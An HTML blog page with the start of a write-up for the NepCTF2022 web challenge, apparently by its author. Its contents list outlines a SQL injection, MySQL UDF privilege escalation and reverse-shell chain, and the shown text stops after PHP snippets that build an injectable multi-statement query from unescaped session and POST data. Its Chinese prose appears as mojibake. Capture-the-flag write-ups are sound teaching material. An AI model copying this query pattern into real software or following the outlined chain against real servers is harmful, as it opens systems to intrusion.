<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#000000"><meta name="author" content="Err0r"><meta name="copyright" content="Err0r"><meta name="generator" content="Hexo 6.3.0"><meta name="theme" content="hexo-theme-yun"><title>NepCTF2022åšå­¦å¤šé—»çš„èŠ±èŠ±WP&amp;å‡ºé¢˜ç¬”è®° | Err0rçš„å°ç«™</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.22/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script><!-- hexo-inject:begin --><!-- hexo-inject:end -->function initScrollReveal() {
  [".post-card",".markdown-body img",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/favicon.ico"><link rel="mask-icon" href="/favicon.ico" color="#000000"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"err0r.top","root":"/","title":"æµ…ä¼´ç‹¬è“çš„å°ç«™","version":"1.10.9","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"æƒ³è¦æœäº›ä»€ä¹ˆï¼Ÿ","empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹: ${query}","hits":"æ‰¾åˆ° ${hits} æ¡ç»“æœ","hits_time":"æ‰¾åˆ° ${hits} æ¡ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false,"src":"/js/search/local-search.js"},"waline":{"config":{"enable":true,"serverURL":"https://comments-err0rcm.vercel.app","comment":true,"visitor":false,"emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis@latest/bilibili/","https://cdn.jsdelivr.net/gh/walinejs/emojis@latest/weibo/","https://cdn.jsdelivr.net/gh/walinejs/emojis@latest/qq/"],"locale":{"placeholder":"å¡«å†™é‚®ç®±ï¼Œå¯ä»¥æ”¶åˆ°å›å¤é€šçŸ¥å“¦ï½"},"requiredMeta":["nick"],"el":"#waline","lang":"zh-CN"},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><link rel="alternate" href="/atom.xml" title="Err0rçš„å°ç«™" type="application/atom+xml"><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><meta name="description" content="NepCTF2022 Webé¢˜Â·åšå­¦å¤šé—»çš„èŠ±èŠ± WP&amp;å‡ºé¢˜ç¬”è®°">
<meta property="og:type" content="article">
<meta property="og:title" content="NepCTF2022åšå­¦å¤šé—»çš„èŠ±èŠ±WP&amp;å‡ºé¢˜ç¬”è®°">
<meta property="og:url" content="https://err0r.top/article/eruditeFlower/index.html">
<meta property="og:site_name" content="Err0rçš„å°ç«™">
<meta property="og:description" content="NepCTF2022 Webé¢˜Â·åšå­¦å¤šé—»çš„èŠ±èŠ± WP&amp;å‡ºé¢˜ç¬”è®°">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20220718201604798.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20220718201827284.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20220718203220152.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20220718194746609.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20220718194810642.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20220718194821729.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20221007121541949.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20221007122036015.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20221005111447545.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20221005111513524.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20221005111744267.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20221005111802999.png">
<meta property="og:image" content="https://err0r.top/article/eruditeFlower/image-20221005111910450.png">
<meta property="article:published_time" content="2022-07-18T11:41:52.000Z">
<meta property="article:modified_time" content="2023-02-15T10:57:00.352Z">
<meta property="article:author" content="Err0r">
<meta property="article:tag" content="blog">
<meta property="article:tag" content="åšå®¢">
<meta property="article:tag" content="Err0r">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://err0r.top/article/eruditeFlower/image-20220718201604798.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script><!-- hexo-inject:begin --><!-- hexo-inject:end -->// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="æ–‡ç« ç›®å½•"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="ç«™ç‚¹æ¦‚è§ˆ"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Err0r"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Err0r"></a><div class="site-author-name"><a href="/about/">Err0r</a></div><a class="site-name" href="/about/site.html">Err0rçš„å°ç«™</a><sub class="site-subtitle">gyy</sub><div class="site-description">å­¦çš„è¶Šå¤šï¼Œè¶Šè§‰å¾—è‡ªå·±æ¸ºå°</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="é¦–é¡µ"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="å½’æ¡£"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">43</span></a></div><div class="site-state-item"><a href="/categories/" title="åˆ†ç±»"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="æ ‡ç­¾"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">11</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="ç•™è¨€æ¿"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-clipboard-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" title="QQ MTkwNjk2ODc2NA==" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Err0rCM" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/8408670" title="å“”å“©å“”å“©" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:err0rcm@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-rss-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://travellings.link/" title="Travelling" target="_blank" style="color:var(--hty-text-color)"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-send-plane-2-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="æˆ‘çš„å°ä¼™ä¼´ä»¬|å‹æƒ…é“¾æ¥" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-open-arm-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write-Up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96admin"><span class="toc-number">2.1.</span> <span class="toc-text">äºŒæ¬¡+å †å æ³¨å…¥è·å–admin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#udf%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.</span> <span class="toc-text">udfææƒ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.2.1.</span> <span class="toc-text">å‰ææ¡ä»¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5-so%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.2.</span> <span class="toc-text">å†™å…¥.soæ–‡ä»¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAudf"><span class="toc-number">2.2.3.</span> <span class="toc-text">åˆ›å»ºudf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">2.2.4.</span> <span class="toc-text">æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.3.</span> <span class="toc-text">æœ€ç»ˆæ­¥éª¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">è¯¦ç»†åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%BD%91%E7%AB%99%E6%B5%81%E7%A8%8B"><span class="toc-number">3.1.</span> <span class="toc-text">åˆ†æç½‘ç«™æµç¨‹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#register"><span class="toc-number">3.1.1.</span> <span class="toc-text">register</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#login"><span class="toc-number">3.1.2.</span> <span class="toc-text">login</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#index"><span class="toc-number">3.1.3.</span> <span class="toc-text">index</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#score"><span class="toc-number">3.1.4.</span> <span class="toc-text">score</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%A9%E4%B8%8B%E7%9A%84%E7%BD%91%E9%A1%B5-amp-%E6%8E%A5%E4%B8%8B%E6%9D%A5%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">3.1.5.</span> <span class="toc-text">å‰©ä¸‹çš„ç½‘é¡µ &amp; æ¥ä¸‹æ¥çš„æ€è·¯</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#config"><span class="toc-number">3.1.5.1.</span> <span class="toc-text">config</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#logout"><span class="toc-number">3.1.5.2.</span> <span class="toc-text">logout</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#rank"><span class="toc-number">3.1.5.3.</span> <span class="toc-text">rank</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8E%A5%E4%B8%8B%E6%9D%A5%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">3.1.5.4.</span> <span class="toc-text">æ¥ä¸‹æ¥çš„æ€è·¯</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%90%BD%E5%9C%B0-so%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.6.</span> <span class="toc-text">è½åœ°.soæ–‡ä»¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAudf-amp-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.1.7.</span> <span class="toc-text">åˆ›å»ºudf &amp; å‘½ä»¤æ‰§è¡Œ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.1.8.</span> <span class="toc-text">åå¼¹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E6%8F%90%E6%9D%83"><span class="toc-number">3.1.9.</span> <span class="toc-text">å°ææƒ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">3.1.10.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q-amp-A"><span class="toc-number">4.</span> <span class="toc-text">Q&amp;A</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81"><span class="toc-number">4.1.</span> <span class="toc-text">ä¸­æ–‡ä¹±ç </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x3D-x3D-x3D-%E4%B8%8E-x3D-x3D-%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">4.2.</span> <span class="toc-text">&#x3D;&#x3D;&#x3D;ä¸&#x3D;&#x3D;çš„é—®é¢˜</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#admin%E7%99%BB%E5%BD%95%E4%B8%8A%E8%BD%A6%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">4.3.</span> <span class="toc-text">adminç™»å½•ä¸Šè½¦çš„é—®é¢˜</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%9D%83%E9%99%90%E9%85%8D%E7%BB%99"><span class="toc-number">4.4.</span> <span class="toc-text">é¢˜ç›®æƒé™é…ç»™</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%9D%83%E9%99%90%E4%B8%8E%E8%A2%AB%E6%90%85shi%E5%90%8E%E7%9A%84%E4%BF%AE%E6%94%B9"><span class="toc-number">4.4.1.</span> <span class="toc-text">æ•°æ®åº“çš„æƒé™ä¸è¢«æ…shiåçš„ä¿®æ”¹</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#challengesAll"><span class="toc-number">4.4.1.1.</span> <span class="toc-text">challengesAll</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#randChallenges"><span class="toc-number">4.4.1.2.</span> <span class="toc-text">randChallenges</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#score-1"><span class="toc-number">4.4.1.3.</span> <span class="toc-text">score</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#userAnswer"><span class="toc-number">4.4.1.4.</span> <span class="toc-text">userAnswer</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#users"><span class="toc-number">4.4.1.5.</span> <span class="toc-text">users</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ctf"><span class="toc-number">4.4.1.6.</span> <span class="toc-text">ctf</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">4.4.1.7.</span> <span class="toc-text">å…¶ä»–</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AF%94%E8%B5%9B%E4%B8%AD%E5%87%BA%E7%8E%B0%E6%90%85%F0%9F%92%A9%E7%9A%84%E7%8A%B6%E5%86%B5"><span class="toc-number">4.4.2.</span> <span class="toc-text">æ¯”èµ›ä¸­å‡ºç°æ…ğŸ’©çš„çŠ¶å†µ</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%8E%AA%E6%96%BD"><span class="toc-number">4.4.2.1.</span> <span class="toc-text">ä¸´æ—¶æªæ–½</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A2%AB%E7%88%86%E7%A0%B4"><span class="toc-number">4.5.</span> <span class="toc-text">é¢˜ç›®è¢«çˆ†ç ´</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%87%8D%E7%BD%AE"><span class="toc-number">4.6.</span> <span class="toc-text">é¢˜ç›®é‡ç½®</span></a></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#000000;"><link itemprop="mainEntityOfPage" href="https://err0r.top/article/eruditeFlower/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Err0r"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Err0rçš„å°ç«™"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">NepCTF2022åšå­¦å¤šé—»çš„èŠ±èŠ±WP&amp;å‡ºé¢˜ç¬”è®°</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="åˆ›å»ºæ—¶é—´ï¼š2022-07-18 19:41:52" itemprop="dateCreated datePublished" datetime="2022-07-18T19:41:52+08:00">2022-07-18</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="ä¿®æ”¹æ—¶é—´ï¼š2023-02-15 18:57:00" itemprop="dateModified" datetime="2023-02-15T18:57:00+08:00">2023-02-15</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="æœ¬æ–‡å­—æ•°"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="æœ¬æ–‡å­—æ•°">5.7k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="é˜…è¯»æ—¶é•¿"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="é˜…è¯»æ—¶é•¿">24m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="é˜…è¯»æ¬¡æ•°"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span id="busuanzi_value_page_pv"></span></span></span><span class="post-meta-divider">-</span><a href="#comment"><span class="post-meta-item-icon" title="è¯„è®ºæ•°"><span class="icon iconify" data-icon="ri:chat-3-line"></span> <span class="waline-comment-count" id="/article/eruditeFlower/"></span></span></a><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Write-Up/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Write-Up</span></a></span></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p>NepCTF2022 Webé¢˜Â·åšå­¦å¤šé—»çš„èŠ±èŠ± WP&amp;å‡ºé¢˜ç¬”è®°</p>
<span id="more"></span>

<p>æˆ‘å…ˆæ‘†ä¸ªé“¾æ¥ï¼Œè¯¶ è¢«åå¥³äººå‚¬å†™wpï¼Œå…ˆæŒ–ä¸ªå‘åœ¨è¿™å•¦ <a href="https://err0r.top/article/eruditeFlower/">https://err0r.top/article/eruditeFlower/</a></p>
<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™é“é¢˜ç›®çš„åŸå‹æ˜¯æˆ‘çš„åŠ¨æ€Webè¯¾è®¾ï¼Œéšéšä¾¿ä¾¿æ’¸äº†ä¸ªè¯¾è®¾ï¼Œç„¶åNepCTFå¼€å§‹ç­¹å¤‡äº†ï¼Œåœ¨å†™æ•°æ®åº“æ“ä½œçš„æ—¶å€™å‘ç°åƒè¿™æ ·ä¸€ä¸ªåŠ¨æ€æŠ½å–é¢˜ç›®ç­”é¢˜çš„ç½‘ç«™ï¼Œå¦‚æœå®‰å…¨æ²¡åšå¥½çš„è¯è‚¯å®šä¸€å †æ¼æ´(<del>äº‹å®ä¸Šè¯¾è®¾æœ€åç­”è¾©æˆ‘çœ‹äº†ä¸‹å…¨æ˜¯æ¼æ´ï¼Œä½†æ¯•ç«Ÿåªæ˜¯ä¸€ä¸ªå¼€å‘çš„è¯¾è®¾</del>)ã€‚è”æƒ³åˆ°å›½å†…è¿‘ä¸€å¹´æ¥çš„ctfé¢˜ç›®ï¼Œå¾ˆå°‘æœ‰è€ƒåˆ°äºŒæ¬¡æ³¨å…¥çš„ï¼Œå› ä¸ºå¤§å¤šæ•°çš„æƒ…å†µä¸‹é‡‡ç”¨çš„æ˜¯é™åˆ¶æ€§åŸåˆ™ï¼Œå³è¿‡æ»¤&#x2F;åŒ¹é…æ›¿æ¢ç­‰é™åˆ¶å­—ç¬¦ä¸²ï¼Œå¹¶æ²¡æœ‰è½¬ä¹‰å­—ç¬¦è¿™æ ·çš„æ“ä½œï¼Œæ°æ°å°±æ˜¯å› ä¸ºè¿™æ ·åšå¦‚æœæ²¡æœ‰é™åˆ¶å¥½å‚æ•°å°±ä¼šäº§ç”ŸäºŒæ¬¡æ³¨å…¥çš„æ¼æ´ï¼Œæˆ‘å°†è¿™ç‚¹å’Œè¯¾è®¾ä¸­multi_queryæ“ä½œè¿›è¡Œç»“åˆï¼Œå†åŠ ä¸Šctfä¸­æ›´åŠ ç½•è§çš„udfææƒæ“ä½œï¼Œå‡ºäº†ä¸€é“é¢˜ç›®ï¼Œå¸Œæœ›å¸ˆå‚…ä»¬èƒ½ç†è§£å…¶ä¸­çš„æ„ä¹‰ã€‚</p>
<p>å‰æ’æŒ‡è·¯ï¼š</p>
<p><a href="#exp">exp</a></p>
<p>å¦‚æœä¸æƒ³çœ‹wpæƒ³çœ‹æˆ‘å¹æ°´çš„å¯ä»¥çœ‹<a href="#Q&A">Q&amp;A</a></p>
<p>åŒ…æ‹¬ä¸€äº›é¿å…æ…shiï¼Œå‡ºé¢˜æ—¶é‡åˆ°çš„é—®é¢˜å’Œåä½œå¼Šå¯¹æŠ—çš„äº‹æƒ…ï¼Œå‡¡äº‹æ€»æœ‰ç¬¬ä¸€æ¬¡ï¼Œå¸Œæœ›èƒ½ç»™åé¢å‡ºé¢˜çš„å¸ˆå‚…ä»¬ä¸€äº›å¸®åŠ©</p>
<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write-Up"></a>Write-Up</h2><h3 id="äºŒæ¬¡-å †å æ³¨å…¥è·å–admin"><a href="#äºŒæ¬¡-å †å æ³¨å…¥è·å–admin" class="headerlink" title="äºŒæ¬¡+å †å æ³¨å…¥è·å–admin"></a>äºŒæ¬¡+å †å æ³¨å…¥è·å–admin</h3><p>æ ¹æ®æºç åœ¨<code>login.php</code>çš„28-30è¡Œï¼Œç”¨æˆ·ç™»å½•åsessionå­˜å‚¨äº†<code>username</code>å’Œ<code>studentid</code>çš„æºæ•°æ®</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>ä¹‹ååœ¨<code>index.php</code>çš„183-184è¡Œå¯ä»¥çœ‹åˆ°åœ¨å­˜å‚¨ç”¨æˆ·ç­”æ¡ˆçš„æ—¶å€™ï¼Œæ²¡æœ‰å¯¹ä¼ å…¥çš„å‚æ•°(<code>$_SESSION[&#39;username&#39;]</code>)è¿›è¡Œè¿‡æ»¤</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into score values (NULL, '"</span><span class="token operator">.</span><span class="token function">addslashes_deep</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"', <span class="token interpolation"><span class="token variable">$getscroe</span></span>);
insert into userAnswer values (NULL, '"</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"', '"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q1'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"', '"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q2'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"', '"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q3'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"', '"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q4'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"', '"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q5'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string 